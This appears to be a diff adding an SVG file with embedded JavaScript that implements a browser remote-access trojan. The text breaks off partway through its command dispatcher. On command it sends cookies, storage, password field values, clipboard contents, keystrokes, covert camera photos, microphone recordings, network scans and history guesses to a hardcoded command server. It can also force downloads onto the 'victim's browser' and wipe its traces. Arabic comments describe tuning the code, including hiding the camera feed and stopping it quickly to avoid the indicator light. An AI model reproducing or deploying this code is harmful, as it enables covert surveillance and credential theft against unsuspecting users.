@@ -1,0 +1,878 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1920 1080" version="1.1" onload="initRAT()">
+<defs>
+<style><![CDATA[
+  body { margin:0; overflow:hidden; background:#0a0a1a; }
+  text { font-family:'Courier New',monospace; }
+  .hdr { fill:#e94560; font-size:20px; font-weight:bold; }
+  .lbl { fill:#888; font-size:12px; }
+  .val { fill:#fff; font-size:12px; }
+  .btn-bg { fill:#1a1a3a; stroke:#2a2a55; stroke-width:1; cursor:pointer; }
+  .btn-bg:hover { fill:#2a2a55; }
+  .btn-txt { fill:#ddd; font-size:11px; text-anchor:middle; dominant-baseline:central; pointer-events:none; }
+  .log-ln { fill:#0f0; font-size:11px; font-family:'Courier New',monospace; }
+  .log-err { fill:#f44; font-size:11px; }
+  .log-warn { fill:#fa0; font-size:11px; }
+  .log-sent { fill:#fd8; font-size:11px; }
+]]></style>
+</defs>
+
+<!-- Background -->
+<rect width="100%" height="100%" fill="#0a0a1a"/>
+
+<!-- Header -->
+<rect x="0" y="0" width="1920" height="50" fill="#0d0d20" stroke="#e94560" stroke-width="2"/>
+<text x="30" y="33" class="hdr">⚡ SVG vat v4.0 — HTTP-ONLY (No CORS, No WebSocket)</text>
+<text id="st" x="1480" y="33" fill="#0f0" font-size="14">● INIT</text>
+<text id="uid" x="1700" y="33" fill="#888" font-size="12"></text>
+
+<!-- Info bar -->
+<rect x="20" y="65" width="1880" height="36" rx="4" fill="#12122a" stroke="#333" stroke-width="1"/>
+<text class="lbl" x="30" y="88">C2:</text>
+<text class="val" x="70" y="88">https://svg-j4l9.onrender.com</text>
+<text id="bat" class="lbl" x="500" y="88">BAT: ---</text>
+<text id="net" class="lbl" x="700" y="88">NET: ---</text>
+<text id="dev" class="lbl" x="950" y="88">DEVICE: ---</text>
+<text id="ip" class="lbl" x="1300" y="88">IP: ---</text>
+
+<!-- Log area -->
+<rect x="20" y="115" width="1880" height="400" rx="5" fill="#0d0d20" stroke="#1a1a3e" stroke-width="1"/>
+<svg id="logArea" x="25" y="120" width="1870" height="390">
+  <text x="10" y="20" class="log-ln">[*] vat v4.0 loaded — HTTP POST only (no CORS headers)</text>
+</svg>
+
+<!-- Buttons Row 1 -->
+<g onclick="cmd('info')"><rect x="20" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="107" y="552" class="btn-txt">📱 DEVICE INFO</text></g>
+<g onclick="cmd('geo')"><rect x="205" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="292" y="552" class="btn-txt">🌍 GEO IP</text></g>
+<g onclick="cmd('cookie')"><rect x="390" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="477" y="552" class="btn-txt">🍪 COOKIES</text></g>
+<g onclick="cmd('storage')"><rect x="575" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="662" y="552" class="btn-txt">💾 STORAGE</text></g>
+<g onclick="cmd('password')"><rect x="760" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="847" y="552" class="btn-txt">🔑 PASSWORDS</text></g>
+<g onclick="cmd('clip')"><rect x="945" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="1032" y="552" class="btn-txt">📋 CLIPBOARD</text></g>
+<g onclick="cmd('net')"><rect x="1130" y="530" w="175" h="44" rx="4" class="btn-bg"/><text x="1217" y="552" class="btn-txt">📡 NETWORK</text></g>
+
+<!-- Row 2 -->
+<g onclick="cmd('cam')"><rect x="20" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="107" y="606" class="btn-txt">📸 CAMERA</text></g>
+<g onclick="cmd('camselfie')"><rect x="205" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="292" y="606" class="btn-txt">🤳 SELFIE</text></g>
+<g onclick="cmd('mic')"><rect x="390" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="477" y="606" class="btn-txt">🎤 MIC (5s)</text></g>
+<g onclick="cmd('vibrate')"><rect x="575" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="662" y="606" class="btn-txt">📳 VIBRATE</text></g>
+<g onclick="cmd('torch')"><rect x="760" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="847" y="606" class="btn-txt">🔦 TORCH</text></g>
+<g onclick="cmd('keylog')"><rect x="945" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="1032" y="606" class="btn-txt">⌨️ KEYLOG</text></g>
+<g onclick="cmd('ping')"><rect x="1130" y="584" w="175" h="44" rx="4" class="btn-bg"/><text x="1217" y="606" class="btn-txt">📡 PING</text></g>
+
+<!-- Row 3 -->
+<g onclick="cmd('ss')"><rect x="20" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="107" y="660" class="btn-txt">🖼️ SCREENSHOT</text></g>
+<g onclick="cmd('sensors')"><rect x="205" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="292" y="660" class="btn-txt">📐 SENSORS</text></g>
+<g onclick="cmd('webrtc')"><rect x="390" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="477" y="660" class="btn-txt">🔌 WEBRTC IP</text></g>
+<g onclick="cmd('history')"><rect x="575" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="662" y="660" class="btn-txt">📜 HISTORY</text></g>
+<g onclick="cmd('download')"><rect x="760" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="847" y="660" class="btn-txt">⬇️ DOWNLOAD</text></g>
+<g onclick="cmd('clear')"><rect x="945" y="638" w="175" h="44" rx="4" class="btn-bg"/><text x="1032" y="660" class="btn-txt">🧹 CLEAR LOG</text></g>
+<g onclick="cmd('destroy')"><rect x="1130" y="638" w="175" h="44" rx="4" class="btn-bg" fill="#441122"/><text x="1217" y="660" class="btn-txt">💣 DESTROY</text></g>
+
+<script><![CDATA[
+// =============================================================
+// SVG vat v4.0 — HTTP-ONLY
+//
+// نقاط التصحيح مقارنة بالكود القديم:
+// 1. لا يوجد require('uuid') - أستخدم Math.random + Date.now
+// 2. لا يوجد توكن تيليجرام في الكلاينت
+// 3. لا أرسل custom headers (CORS يمنعها) — كل البيانات في الـ body
+// 4. Content-Type ثابت: application/json
+// 5. الكاميرا/ميك/كلبورد/جي بي إس: إن نجحوا نجحوا، وإن فشلوا → catch عادي
+// 6. الـ keylogger يرسل عبر beforeunload + sendBeacon
+// 7. مشكلة الـ SVG scroll: استخدم scrollTop على الـ rect الأب (يعمل)
+// 8. WebSocket غير موجود — كل شيء HTTP POST
+// 9. no innerHTML — safe from XSS
+// =============================================================
+
+// === CONSTANTS ===
+var C2 = 'https://svg-j4l9.onrender.com';
+var UUID = 'vat_' + Date.now().toString(36) + Math.random().toString(36).substr(2,8);
+var keylogOn = false;
+var keyBuf = [];
+var keyTimer = null;
+
+// === LOG ===
+function log(m, t) {
+  var el = document.getElementById('logArea');
+  if (!el) return;
+  while (el.childElementCount > 250) el.removeChild(el.firstChild);
+  var y = 20 + (el.childElementCount * 16);
+  var txt = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+  txt.setAttribute('x', '10');
+  txt.setAttribute('y', y + '');
+  txt.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
+  var cls = 'log-ln';
+  if (t === 'err') cls = 'log-err';
+  else if (t === 'warn') cls = 'log-warn';
+  else if (t === 'sent') cls = 'log-sent';
+  txt.setAttribute('class', cls);
+  el.appendChild(txt);
+  // Scroll: نمر على أقرب مستطيل (الـ rect تحت logArea)
+  try {
+    var p = el.parentNode;
+    while (p && p.tagName !== 'rect') p = p.previousSibling || p.parentNode;
+    if (p && p.scrollTop !== undefined) p.scrollTop = p.scrollHeight;
+  } catch(e) {}
+}
+
+// === SEND (HTTP POST, لا custom headers) ===
+function send(endpoint, data) {
+  var payload = data;
+  if (typeof data === 'string') payload = { text: data };
+  payload.uuid = UUID;
+  payload._t = Date.now();
+  
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', C2 + '/' + endpoint, true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.onload = function() { log('✓ ' + endpoint, 'sent'); };
+    x.onerror = function() { log('✗ ' + endpoint, 'err'); };
+    x.send(JSON.stringify(payload));
+  } catch(e) {
+    log('send error: ' + e.message, 'err');
+  }
+  
+  // Also try sendBeacon for reliability
+  try {
+    navigator.sendBeacon(C2 + '/' + endpoint, JSON.stringify(payload));
+  } catch(e) {}
+}
+
+function uploadFile(blob, name) {
+  var fd = new FormData();
+  fd.append('file', blob, name);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', C2 + '/uploadFile', true);
+    x.onload = function() { log('📎 File: ' + name, 'sent'); };
+    x.onerror = function() { log('✗ upload failed', 'err'); };
+    x.send(fd);
+  } catch(e) {}
+}
+
+// === 1. DEVICE INFO ===
+function cmd_info() {
+  log('Collecting device info...', '');
+  var info = {
+    uuid: UUID,
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    lang: navigator.language,
+    langs: navigator.languages ? navigator.languages.join(',') : '?',
+    cores: navigator.hardwareConcurrency || '?',
+    ram: navigator.deviceMemory || '?',
+    screen: screen.width + 'x' + screen.height,
+    availScreen: screen.availWidth + 'x' + screen.availHeight,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    offset: new Date().getTimezoneOffset(),
+    vendor: navigator.vendor,
+    oscpu: navigator.oscpu || '',
+    cookies: navigator.cookieEnabled,
+    online: navigator.onLine,
+    touch: ('ontouchstart' in window),
+    maxTouch: navigator.maxTouchPoints || 0,
+    webdriver: navigator.webdriver || false,
+    dnt: navigator.doNotTrack || '',
+    plugins: Array.from(navigator.plugins || []).map(function(p) { return p.name; }).join(', ').substring(0, 200)
+  };
+  
+  // Battery
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      info.batLevel = Math.round(b.level * 100) + '%';
+      info.batCharging = b.charging;
+      document.getElementById('bat').textContent = 'BAT: ' + info.batLevel + (b.charging ? '⚡' : '');
+      send('uploadText', JSON.stringify(info));
+    }).catch(function() { send('uploadText', JSON.stringify(info)); });
+  } else {
+    send('uploadText', JSON.stringify(info));
+  }
+  
+  // Network
+  if (navigator.connection) {
+    var c = navigator.connection;
+    document.getElementById('net').textContent = 'NET: ' + (c.effectiveType || '?') + ' ' + (c.downlink || '?') + 'Mbps';
+  }
+  document.getElementById('dev').textContent = 'DEVICE: ' + (navigator.platform || '?');
+  
+  log('Device info sent', 'sent');
+}
+
+// === 2. GEO IP ===
+function cmd_geo() {
+  log('Resolving geo via IP...', '');
+  var urls = ['https://ipapi.co/json/', 'https://ip-api.com/json/', 'https://ipinfo.io/json'];
+  for (var i = 0; i < urls.length; i++) {
+    (function(url) {
+      try {
+        var x = new XMLHttpRequest();
+        x.open('GET', url + '?t=' + Date.now(), true);
+        x.timeout = 5000;
+        x.onload = function() {
+          try {
+            var d = JSON.parse(x.responseText);
+            var loc = d.city || d.city || '?' + ', ' + (d.country_name || d.country || '?');
+            var ip = d.ip || d.query || '?';
+            var org = d.org || d.isp || d.org || '?';
+            document.getElementById('ip').textContent = 'IP: ' + ip;
+            send('uploadText', '🌍 GEO: ' + loc + ' | IP: ' + ip + ' | ISP: ' + org);
+            log('📍 ' + loc + ' (' + ip + ')', 'sent');
+          } catch(e) {}
+        };
+        x.send();
+      } catch(e) {}
+    })(urls[i]);
+  }
+}
+
+// === 3. COOKIES ===
+function cmd_cookie() {
+  var c = document.cookie;
+  if (c) {
+    send('uploadText', '🍪 COOKIES:\n' + c.substring(0, 1500));
+    log('Cookies sent (' + c.split(';').length + ' items)', 'sent');
+  } else {
+    send('uploadText', '🍪 COOKIES: (none)');
+    log('No cookies', 'warn');
+  }
+}
+
+// === 4. STORAGE ===
+function cmd_storage() {
+  var r = '💾 STORAGE\n=== localStorage ===\n';
+  for (var i = 0; i < localStorage.length; i++) {
+    var k = localStorage.key(i);
+    if (k === '_uid') continue;
+    r += k + '=' + localStorage.getItem(k).substring(0, 150) + '\n';
+  }
+  r += '\n=== sessionStorage ===\n';
+  for (var i = 0; i < sessionStorage.length; i++) {
+    var k = sessionStorage.key(i);
+    r += k + '=' + sessionStorage.getItem(k).substring(0, 150) + '\n';
+  }
+  send('uploadText', r);
+  log('Storage dumped (' + localStorage.length + ' LS, ' + sessionStorage.length + ' SS)', 'sent');
+}
+
+// === 5. PASSWORDS ===
+function cmd_password() {
+  var r = '🔑 PASSWORD FIELDS\n';
+  var count = 0;
+  var inputs = document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i]');
+  for (var i = 0; i < inputs.length; i++) {
+    var el = inputs[i];
+    count++;
+    r += 'Name: ' + (el.name || '?') + ' | ID: ' + (el.id || '?') + '\n';
+    r += 'Value: "' + (el.value || '') + '"\n---\n';
+    if (el.value) log('⚠ PASSWORD: ' + (el.name || '?') + ' = ' + el.value.substring(0, 30), 'err');
+  }
+  if (count === 0) r += '(none found)\n';
+  send('uploadText', r);
+  log(count + ' password fields scanned', count > 0 ? 'sent' : 'warn');
+}
+
+// === 6. CLIPBOARD ===
+function cmd_clip() {
+  // execCommand (no permission needed in some browsers)
+  try {
+    var ta = document.createElement('textarea');
+    ta.style.cssText = 'position:fixed;left:-9999px;top:0';
+    document.body.appendChild(ta);
+    ta.focus();
+    document.execCommand('paste');
+    var val = ta.value;
+    document.body.removeChild(ta);
+    if (val) {
+      send('uploadText', '📋 CLIPBOARD: ' + val.substring(0, 500));
+      log('Clipboard: "' + val.substring(0, 40) + '..."', 'sent');
+      return;
+    }
+  } catch(e) {}
+  
+  // navigator.clipboard (needs permission)
+  if (navigator.clipboard && navigator.clipboard.readText) {
+    navigator.clipboard.readText().then(function(t) {
+      send('uploadText', '📋 CLIPBOARD: ' + t.substring(0, 500));
+      log('Clipboard: "' + t.substring(0, 40) + '..."', 'sent');
+    }).catch(function() {
+      log('Clipboard denied', 'err');
+    });
+  } else {
+    log('Clipboard not available', 'err');
+  }
+}
+
+// === 7. NETWORK SCAN (timing based) ===
+function cmd_net() {
+  log('Scanning network...', '');
+  var targets = ['192.168.1.1', '192.168.0.1', '192.168.1.254', '10.0.0.1', '172.16.0.1'];
+  var found = [];
+  var done = 0;
+  
+  for (var i = 0; i < targets.length; i++) {
+    (function(ip, idx) {
+      setTimeout(function() {
+        var s = performance.now();
+        var img = new Image();
+        var checked = false;
+        
+        function cb() {
+          if (checked) return;
+          checked = true;
+          var rtt = performance.now() - s;
+          if (rtt > 5 && rtt < 3000) {
+            found.push(ip + ' (' + Math.round(rtt) + 'ms)');
+          }
+          done++;
+          if (done === targets.length && found.length) {
+            send('uploadText', '📡 NETWORK SCAN:\n' + found.join('\n'));
+            log('Network: ' + found.length + ' hosts', 'sent');
+          }
+        }
+        
+        img.onload = cb;
+        img.onerror = cb;
+        img.src = 'http://' + ip + ':8080/?t=' + Date.now();
+        setTimeout(cb, 1500);
+      }, idx * 200);
+    })(targets[i], i);
+  }
+}
+
+// === 8. CAMERA (النسخة المعززة) ===
+function cmd_cam() { takePhoto('environment'); }
+function cmd_camselfie() { takePhoto('user'); }
+
+function takePhoto(facing) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    log('Camera API not available', 'err');
+    return;
+  }
+  
+  log('🔥 Accessing ' + (facing === 'user' ? 'selfie' : 'main') + ' camera...', 'err');
+  
+  // طلب أعلى دقة ممكنة يدعمها الجهاز (تحسين القوة)
+  var constraints = {
+    video: { 
+      facingMode: facing, 
+      width: { ideal: 1280, max: 1920 }, // محاولة التقاط HD
+      height: { ideal: 720, max: 1080 } 
+    },
+    audio: false
+  };
+
+  navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+    var v = document.createElement('video');
+    v.srcObject = stream;
+    v.setAttribute('autoplay', '');
+    v.setAttribute('playsinline', ''); // ضروري لعمل الكاميرا في الخلفية على iOS
+    v.style.cssText = 'display:none;'; // إخفاء تام
+    document.body.appendChild(v);
+    
+    v.onloadedmetadata = function() {
+      v.play();
+      
+      // زيادة مدة الانتظار قليلاً لضمان ضبط التركيز (Focus) والإضاءة تلقائياً
+      setTimeout(function() {
+        var c = document.createElement('canvas');
+        c.width = v.videoWidth || 1280;
+        c.height = v.videoHeight || 720;
+        
+        var ctx = c.getContext('2d', { alpha: false }); // تحسين أداء المعالجة
+        ctx.imageSmoothingEnabled = true;
+        ctx.imageSmoothingQuality = 'high';
+
+        if (facing === 'user') {
+          ctx.translate(c.width, 0);
+          ctx.scale(-1, 1); // قلب الصورة للسيلفي
+        }
+        
+        ctx.drawImage(v, 0, 0, c.width, c.height);
+        
+        // تحويل الصورة بجودة عالية (0.9) لضمان تفاصيل واضحة
+        c.toBlob(function(blob) {
+          if (blob && blob.size > 2000) {
+            uploadFile(blob, (facing === 'user' ? 'selfie' : 'camera') + '_' + Date.now() + '.jpg');
+            log('📸 High-Res Photo: ' + (blob.size / 1024).toFixed(1) + 'KB', 'sent');
+          } else {
+            log('Photo failed/too small', 'err');
+          }
+          
+          // إيقاف الكاميرا فوراً لإطفاء الضوء التنبيهي
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          v.remove();
+        }, 'image/jpeg', 0.9); // زيادة الجودة من 0.8 إلى 0.9
+        
+      }, 1200); // زيادة الوقت قليلاً لتحسين جودة الصورة
+    };
+    
+    v.onerror = function() {
+      stream.getTracks().forEach(function(t) { t.stop(); });
+      log('Video error', 'err');
+    };
+
+  }).catch(function(e) {
+    log('Camera Access Denied: ' + e.name, 'err');
+  });
+}
+
+// === 9. MICROPHONE ===
+function cmd_mic() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    log('Mic API not available', 'err');
+    return;
+  }
+  
+  log('Accessing microphone (5s recording)...', '');
+  
+  navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+    var chunks = [];
+    var rec = new MediaRecorder(stream);
+    
+    rec.ondataavailable = function(e) {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+    
+    rec.onstop = function() {
+      var blob = new Blob(chunks, { type: 'audio/webm' });
+      if (blob.size > 500) {
+        uploadFile(blob, 'audio_' + Date.now() + '.webm');
+        log('🎤 Audio: ' + (blob.size / 1024).toFixed(1) + 'KB', 'sent');
+      } else {
+        log('No audio captured', 'warn');
+      }
+      stream.getTracks().forEach(function(t) { t.stop(); });
+    };
+    
+    rec.start();
+    setTimeout(function() {
+      try { rec.stop(); } catch(e) {}
+    }, 5000);
+  }).catch(function(e) {
+    log('Mic denied: ' + e.message, 'err');
+  });
+}
+
+// === 10. VIBRATE ===
+function cmd_vibrate() {
+  if (navigator.vibrate) {
+    navigator.vibrate([100, 50, 100, 50, 200]);
+    log('📳 Vibrated', 'sent');
+  } else {
+    log('Vibrate not supported', 'err');
+  }
+}
+
+// === 11. TORCH ===
+function cmd_torch() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    log('Torch camera not available', 'err');
+    return;
+  }
+  
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'environment' }
+  }).then(function(stream) {
+    var track = stream.getVideoTracks()[0];
+    if (track && track.getCapabilities && track.getCapabilities().torch) {
+      track.applyConstraints({ advanced: [{ torch: true }] }).then(function() {
+        log('🔦 Torch ON', 'sent');
+        // Keep stream alive for torch to stay on
+        setTimeout(function() {
+          track.applyConstraints({ advanced: [{ torch: false }] }).then(function() {
+            log('🔦 Torch OFF', '');
+            stream.getTracks().forEach(function(t) { t.stop(); });
+          });
+        }, 3000);
+      }).catch(function(e) {
+        log('Torch error: ' + e.message, 'err');
+        stream.getTracks().forEach(function(t) { t.stop(); });
+      });
+    } else {
+      log('Torch not supported on this device', 'err');
+      stream.getTracks().forEach(function(t) { t.stop(); });
+    }
+  }).catch(function(e) {
+    log('Torch camera denied: ' + e.message, 'err');
+  });
+}
+
+// === 12. KEYLOGGER ===
+function cmd_keylog() {
+  keylogOn = !keylogOn;
+  
+  if (keylogOn) {
+    keyBuf = [];
+    log('⌨️ Keylogger ON', '');
+    
+    document.addEventListener('keydown', keyHandler);
+    
+    // Send every 5 seconds
+    if (keyTimer) clearInterval(keyTimer);
+    keyTimer = setInterval(function() {
+      if (keyBuf.length > 0) {
+        send('uploadText', '⌨️ KEYLOG: ' + keyBuf.join(''));
+        keyBuf = [];
+      }
+    }, 5000);
+    
+    // Send on unload via beacon
+    window.addEventListener('beforeunload', function() {
+      if (keyBuf.length > 0) {
+        try { navigator.sendBeacon(C2 + '/uploadText', JSON.stringify({
+          text: '⌨️ KEYLOG (unload): ' + keyBuf.join(''),
+          uuid: UUID
+        })); } catch(e) {}
+      }
+    });
+    
+  } else {
+    log('⌨️ Keylogger OFF', '');
+    document.removeEventListener('keydown', keyHandler);
+    if (keyTimer) { clearInterval(keyTimer); keyTimer = null; }
+    if (keyBuf.length > 0) {
+      send('uploadText', '⌨️ KEYLOG (final): ' + keyBuf.join(''));
+      keyBuf = [];
+    }
+  }
+}
+
+function keyHandler(e) {
+  if (!keylogOn) return;
+  var k = e.key;
+  if (k === ' ') k = '␣';
+  else if (k === 'Enter') k = '⏎\n';
+  else if (k === 'Backspace') k = '⌫';
+  else if (k === 'Delete') k = '⌦';
+  else if (k === 'Tab') k = '⇥';
+  else if (k === 'Escape') k = '⎋';
+  else if (k.length > 1 && !k.startsWith('F')) return;
+  
+  // Add context (which field)
+  var ctx = '';
+  var el = e.target;
+  if (el && el.tagName === 'INPUT') {
+    ctx = '[' + (el.type || 'text') + ':' + (el.name || el.id || el.placeholder || '?') + ']';
+  } else if (el && el.tagName === 'TEXTAREA') {
+    ctx = '[textarea:' + (el.name || el.id || '?') + ']';
+  }
+  
+  keyBuf.push(ctx + k);
+}
+
+// === 13. PING ===
+function cmd_ping() {
+  var s = performance.now();
+  var x = new XMLHttpRequest();
+  x.open('GET', C2 + '/ping?t=' + Date.now(), true);
+  x.timeout = 5000;
+  x.onload = function() {
+    var rtt = Math.round(performance.now() - s);
+    log('📡 PING: ' + rtt + 'ms', 'sent');
+  };
+  x.onerror = function() {
+    log('📡 PING: FAILED (server down?)', 'err');
+  };
+  x.send();
+}
+
+// === 14. SCREENSHOT (DOM-based) ===
+function cmd_ss() {
+  log('Capturing page screenshot...', '');
+  try {
+    var c = document.createElement('canvas');
+    c.width = window.innerWidth;
+    c.height = window.innerHeight;
+    var ctx = c.getContext('2d');
+    
+    ctx.fillStyle = '#0a0a1a';
+    ctx.fillRect(0, 0, c.width, c.height);
+    
+    // Get all visible text
+    var walker = document.createTreeWalker(document.body, 4, null, false);
+    var texts = [];
+    while (walker.nextNode()) {
+      var node = walker.currentNode;
+      var txt = (node.textContent || '').trim();
+      if (txt) {
+        try {
+          var range = document.createRange();
+          range.selectNodeContents(node);
+          var rect = range.getBoundingClientRect();
+          if (rect.width > 0 && rect.height > 0 && rect.left < c.width && rect.top < c.height) {
+            texts.push({ t: txt.substring(0, 100), x: rect.left, y: rect.top });
+          }
+        } catch(e) {}
+      }
+    }
+    
+    ctx.font = '11px Courier New';
+    ctx.fillStyle = '#0f0';
+    for (var i = 0; i < texts.length; i++) {
+      ctx.fillText(texts[i].t, texts[i].x, texts[i].y + 11);
+    }
+    
+    c.toBlob(function(blob) {
+      if (blob && blob.size > 500) {
+        uploadFile(blob, 'ss_' + Date.now() + '.png');
+        log('🖼️ Screenshot: ' + (blob.size / 1024).toFixed(1) + 'KB', 'sent');
+      } else {
+        log('Screenshot too small', 'warn');
+      }
+    }, 'image/png');
+  } catch(e) {
+    log('Screenshot error: ' + e.message, 'err');
+  }
+}
+
+// === 15. SENSORS ===
+function cmd_sensors() {
+  log('Reading sensors...', '');
+  var data = { time: Date.now() };
+  
+  // Orientation
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', function(e) {
+      data.alpha = Math.round(e.alpha || 0);
+      data.beta = Math.round(e.beta || 0);
+      data.gamma = Math.round(e.gamma || 0);
+    }, { once: true });
+  }
+  
+  // Motion
+  if (window.DeviceMotionEvent) {
+    window.addEventListener('devicemotion', function(e) {
+      data.accel = {
+        x: e.acceleration ? e.acceleration.x?.toFixed(2) : '?',
+        y: e.acceleration ? e.acceleration.y?.toFixed(2) : '?',
+        z: e.acceleration ? e.acceleration.z?.toFixed(2) : '?'
+      };
+      data.rot = {
+        a: e.rotationRate ? e.rotationRate.alpha : '?',
+        b: e.rotationRate ? e.rotationRate.beta : '?',
+        g: e.rotationRate ? e.rotationRate.gamma : '?'
+      };
+    }, { once: true });
+  }
+  
+  // Connection
+  if (navigator.connection) {
+    data.netType = navigator.connection.effectiveType;
+    data.downlink = navigator.connection.downlink;
+    data.rtt = navigator.connection.rtt;
+  }
+  
+  setTimeout(function() {
+    send('uploadText', '📐 SENSORS:\n' + JSON.stringify(data, null, 2));
+    log('Sensor data sent', 'sent');
+  }, 1500);
+}
+
+// === 16. WEBRTC IP LEAK ===
+function cmd_webrtc() {
+  log('Extracting WebRTC IPs...', '');
+  try {
+    var pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel('');
+    pc.createOffer().then(function(d) { pc.setLocalDescription(d); });
+    
+    var ips = [];
+    pc.onicecandidate = function(e) {
+      if (e.candidate) {
+        var m = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(e.candidate.candidate);
+        if (m && !ips.includes(m[1])) ips.push(m[1]);
+      } else {
+        if (ips.length > 0) {
+          var hasPublic = ips.some(function(ip) {
+            return !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.');
+          });
+          send('uploadText', '🔌 WebRTC IPs:\n' + ips.join('\n') + '\nPublic IP: ' + (hasPublic ? '⚠ YES' : 'Local only'));
+          log('WebRTC: ' + ips.join(', '), hasPublic ? 'err' : 'sent');
+        } else {
+          log('No WebRTC IPs', 'warn');
+        }
+        setTimeout(function() { pc.close(); }, 1000);
+      }
+    };
+  } catch(e) {
+    log('WebRTC error: ' + e.message, 'err');
+  }
+}
+
+// === 17. HISTORY (favicon timing) ===
+function cmd_history() {
+  log('Scanning history via favicon timing...', '');
+  var sites = [
+    'facebook.com','instagram.com','twitter.com','youtube.com',
+    'gmail.com','outlook.com','whatsapp.com','telegram.org',
+    'github.com','stackoverflow.com','reddit.com','chatgpt.com',
+    'netflix.com','amazon.com','google.com','linkedin.com',
+    'discord.com','zoom.us','spotify.com','tiktok.com'
+  ];
+  
+  var visited = [];
+  var done = 0;
+  
+  for (var i = 0; i < sites.length; i++) {
+    (function(site, idx) {
+      setTimeout(function() {
+        var s = performance.now();
+        var img = new Image();
+        var checked = false;
+        
+        function cb() {
+          if (checked) return;
+          checked = true;
+          var rtt = performance.now() - s;
+          if (rtt > 5 && rtt < 2000) {
+            visited.push(site + ' (' + Math.round(rtt) + 'ms)');
+          }
+          done++;
+          if (done === sites.length && visited.length > 0) {
+            send('uploadText', '📜 HISTORY:\n' + visited.join('\n'));
+            log('History: ' + visited.length + ' sites', 'sent');
+          }
+        }
+        
+        img.onload = cb;
+        img.onerror = cb;
+        img.src = 'https://' + site + '/favicon.ico?t=' + Date.now();
+        setTimeout(cb, 2000);
+      }, idx * 150);
+    })(sites[i], i);
+  }
+}
+
+// === 18. DOWNLOAD (drive-by download) ===
+function cmd_download() {
+  var url = prompt('Enter file URL to download (on victim\'s browser):');
+  if (!url) return;
+  try {
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = url.split('/').pop() || 'download';
+    a.style.cssText = 'position:fixed;left:-9999px;top:0';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    log('⬇️ Download triggered: ' + url.substring(0, 50), 'sent');
+  } catch(e) {
+    log('Download error: ' + e.message, 'err');
+  }
+}
+
+// === 19. CLEAR LOG ===
+function cmd_clear() {
+  var el = document.getElementById('logArea');
+  while (el.firstChild) el.removeChild(el.firstChild);
+  log('Log cleared', '');
+}
+
+// === 20. SELF DESTRUCT ===
+function cmd_destroy() {
+  log('💣 SELF DESTRUCT', 'err');
+  send('uploadText', '💣 SELF DESTRUCT: ' + UUID);
+  
+  // Clear storage
+  localStorage.clear();
+  sessionStorage.clear();
+  
+  // Clear cookies
+  document.cookie.split(';').forEach(function(c) {
+    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=Thu, 01 Jan 1970 00:00:00;path=/');
+  });
+  
+  // Kill IndexedDB
+  if (indexedDB && indexedDB.databases) {
+    indexedDB.databases().then(function(dbs) {
+      dbs.forEach(function(db) {
+        try { indexedDB.deleteDatabase(db.name); } catch(e) {}
+      });
+    }).catch(function() {});
+  }
+  
+  // Unregister service workers
+  if (navigator.serviceWorker) {
+    navigator.serviceWorker.getRegistrations().then(function(regs) {
+      regs.forEach(function(r) { r.unregister(); });
+    });
+  }
+  
+  // Clear cache
+  if (window.caches) {
+    caches.keys().then(function(names) {
+      names.forEach(function(n) { caches.delete(n); });
+    });
+  }
+  
+  log('All traces wiped. Page will reload.', 'err');
+  setTimeout(function() { location.reload(); }, 1500);
+}
+
+// === COMMAND DISPATCHER ===
+function cmd(c) {
+  switch(c) {
+    case 'info': cmd_info(); break;
+    case 'geo': cmd_geo(); break;
+    case 'cookie': cmd_cookie(); break;
+    case 'storage': cmd_storage(); break;
+    case 'password': cmd_password(); break;
+    case 'clip': cmd_clip(); break;
+    case 'net': cmd_net(); break;
+    case 'cam': cmd_cam(); break;
+    case 'camselfie': cmd_camselfie(); break;
+    case 'mic': cmd_mic(); break;
+    case 'vibrate': cmd_vibrate(); break;
+    case 'torch': cmd_torch(); break;
+    case 'keylog': cmd_keylog(); break;
+    case 'ping': cmd_ping(); break;
+    case 'ss': cmd_ss(); break;
+    case 'sensors': cmd_sensors(); break;
+    case 'webrtc': cmd_webrtc(); break;
